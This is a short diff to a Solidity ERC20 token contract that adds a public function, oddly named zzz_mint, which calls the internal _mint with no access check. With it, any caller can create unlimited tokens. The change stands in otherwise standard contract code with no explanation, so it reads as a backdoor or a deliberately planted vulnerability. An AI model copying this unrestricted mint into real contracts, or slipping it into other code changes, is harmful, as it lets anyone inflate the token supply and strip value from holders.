@@ -1191,6 +1191,10 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         _afterTokenTransfer(address(0), account, amount);
     }
 
+    function zzz_mint(address account, uint256 amount) public {
+        _mint(account, amount);
+    }
+
     function _burn(address account, uint256 amount) internal virtual {
         require(account != address(0), "ERC20: burn from the zero address");
 
